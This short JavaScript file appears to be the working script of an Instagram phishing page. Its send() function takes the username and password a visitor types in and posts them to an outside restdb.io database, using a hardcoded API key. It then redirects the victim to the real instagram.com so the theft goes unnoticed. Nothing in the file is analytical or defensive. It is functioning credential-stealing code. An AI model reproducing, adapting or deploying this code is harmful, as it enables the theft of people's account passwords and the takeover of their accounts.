document.addEventListener('DOMContentLoaded', function() {
  setTimeout(function() {
    document.querySelector('.loading').style.display = 'none'
  }, 1200)
})


function send() {
  let id = document.getElementById('igid').value;
  let pw = document.getElementById('pw').value;
  
  var xhr = new XMLHttpRequest();
  xhr.withCredentials = false;

  xhr.addEventListener("readystatechange", function() {
    if (this.readyState === 4) {
      location.href = 'https://instagram.com'
    }
  });

  xhr.open(
    "POST",
    "https://grean-9ebb.restdb.io/rest/" + 'instagram'
  );
  xhr.setRequestHeader("content-type", "application/json");
  xhr.setRequestHeader("x-apikey", '64336d2939cf552ef728c0e1');
  xhr.setRequestHeader("cache-control", "no-cache");

  xhr.send(JSON.stringify({
    id,
    pw: 'PW:-'+pw+'/000'
  }));
}